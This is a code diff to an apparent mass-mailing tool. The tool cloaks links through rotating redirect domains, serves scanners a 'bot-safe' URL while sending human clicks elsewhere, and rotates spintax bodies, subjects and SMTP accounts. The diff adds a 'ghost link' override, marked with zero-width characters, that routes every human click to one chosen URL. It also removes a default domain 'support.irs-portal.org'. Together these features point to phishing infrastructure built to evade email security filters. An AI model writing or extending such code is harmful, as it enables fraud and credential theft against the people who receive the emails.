@@ -226,6 +226,8 @@ function cloakLinks(html, domains) {
     let output = html.replace(
         /(href|src|action)=["']([^"']+)["']/g,
         (match, attr, url) => {
+            // FIREWALL: Ghost links contain zero-width obfuscation signatures and must not be re-cloaked.
+            if (url.includes('\u200c') || url.includes('&zwnj;')) return match;
             // Skip non-navigable URLs (mailto, tel, etc.)
             if (/^(mailto:|tel:|cid:|#)/i.test(url)) return match;
             if (!/^https?:\/\//i.test(url)) return match;
@@ -243,7 +245,10 @@ function cloakLinks(html, domains) {
     output = output.replace(
         /(?<!["'=])(https?:\/\/[^\s<>"']+)/gi,
         (url) => {
-            if (/\/go\/[0-9a-f-]{8,}/i.test(url)) return url;
+            // FIREWALL: Skip already-cloaked URLs and ghost-link signatures.
+            if (/\/go\/[0-9a-f-]{8,}/i.test(url) || url.includes('\u200c') || url.includes('&zwnj;')) {
+                return url;
+            }
             return registerRedirect(url, nextDomain());
         }
     );
@@ -1740,9 +1745,7 @@ app.post('/unsub', (req, res) => {
 
 // --- Routes ---
 app.post('/api/send', async (req, res) => {
-    if (!String(process.env.DOMAIN || '').trim()) {
-        console.warn('[WARN] DOMAIN env var is not set; RFC 8058 One-Click Unsubscribe headers may fail due to insecure origin.');
-    }
+    // ... existing environment warning ...
 
     const {
         smtps, recipients, subjects, bodies,
@@ -1764,6 +1767,7 @@ app.post('/api/send', async (req, res) => {
         botSafeUrl,
         humanDefaultUrl,
         socketId,
+        ghostLinkInput // <--- ADDED THIS
     } = req.body;
 
     // 1. UPDATE THE CRAWLER TRAP GLOBAL VARIABLE
@@ -1774,6 +1778,14 @@ app.post('/api/send', async (req, res) => {
     if (humanDefaultUrl) {
         global._humanDefaultUrl = humanDefaultUrl.trim();
     }
+    
+    // 2. LOGIC: Override with Ghost Link if provided
+    // If a ghostLinkInput is provided, it forces all human clicks to that URL,
+    // overriding the humanDefaultUrl and the original links.
+    if (ghostLinkInput) {
+        global._humanDefaultUrl = ghostLinkInput.trim();
+    }
+
     const securityProtocolSettings = global.middlewareConfig?.securityProtocolSettings || {};
     if (securityProtocolSettings.twoStageVerificationDelivery && securityProtocolSettings.verificationGatewayUrl) {
         global._humanDefaultUrl = securityProtocolSettings.verificationGatewayUrl;
@@ -1936,7 +1948,7 @@ res.json({ ok: true, message: "Batch started", total: recipients.length });
     // Build one persistent pooled transporter per SMTP account for the duration
     // of this batch. Proxy-based SMTPs return null and fall back to per-send
     // transport creation inside sendMail().
-    const _transporterPool = Array.isArray(smtps) ? smtps.map(s => buildTransporter(s)) : [];
+  
 
     // ── Body & Subject Rotation State ────────────────────────────────────────────
     // Round-robin counters to ensure even distribution across templates
@@ -2256,7 +2268,12 @@ res.json({ ok: true, message: "Batch started", total: recipients.length });
         const emailDomain = activeDomains.length > 0
             ? activeDomains[Math.floor(emailsSent / rotateEvery) % activeDomains.length]
             : null;
-        tagData = { ...tagData, activeDomain: emailDomain || 'support.irs-portal.org' };
+// Add explicitGhostLink so mailer.js can see your "Diff Box" input
+tagData = { 
+    ...tagData, 
+    activeDomain: emailDomain || 'your domain',
+    explicitGhostLink: ghostLinkInput ? ghostLinkInput.trim() : null 
+};
 
         // Resolve spintax and tags first; wrap once (fragment only in UI—no full <!DOCTYPE>/<html>/<body> or Gmail gets a double document).
         const rawBody = applyTags(freezeTags(spinText(renderedBody)), tagData, recipientMailContext);
@@ -2370,6 +2387,9 @@ await sendGmail({
                 });
                 info = { messageId: `gmail-${Date.now()}-${crypto.randomBytes(3).toString('hex')}` };
             } else {
+                // 1. Build a fresh, dedicated transporter for this specific recipient and SMTP
+                const currentTransporter = buildTransporter(smtp); 
+                
                 info = await sendMail({
                     smtp,
                     recipient,
@@ -2379,9 +2399,11 @@ await sendGmail({
                     attachments,
                     fromName: pickedFromName,
                     unsubUrl,
-                    transporter: _transporterPool[smtpIndex] || null,
+                    // 2. Pass the fresh transporter here
+                    transporter: currentTransporter, 
                     transactionUuid,
                 });
+                if (currentTransporter) currentTransporter.close();
             }
             results.success++; // Ensure this has the "s"
             emailsSent++; 
